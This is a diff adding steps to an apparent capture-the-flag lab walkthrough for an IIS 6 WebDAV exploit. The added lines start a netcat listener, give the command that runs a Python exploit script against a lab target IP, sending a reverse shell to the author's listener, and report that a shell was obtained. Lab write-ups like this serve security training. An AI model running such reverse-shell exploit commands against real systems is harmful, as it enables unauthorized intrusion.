@@ -113,7 +113,21 @@ usage:iis6webdav.py targetip targetport reverseip reverseport
 ```
 So, we have to specify the targetip and targetport, also our tun0 ip address and the port we plan on listening on
 
+First, lets setup our netcat listener
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8d39bf3-5ab5-4ca3-ab3a-6e11d401c3af)
+
+Now, lets run the exploit script
+
+command:```python2 iis6\ reverse\ shell 10.129.74.174 80 10.10.14.122 1234```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa7a90cc-f39f-48ac-9f2d-29d7ea98a203)
+
+Checking our netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0cb72701-5ce3-4176-a704-f6bcdfab17a6)
+
+We got a shell
 
 
 
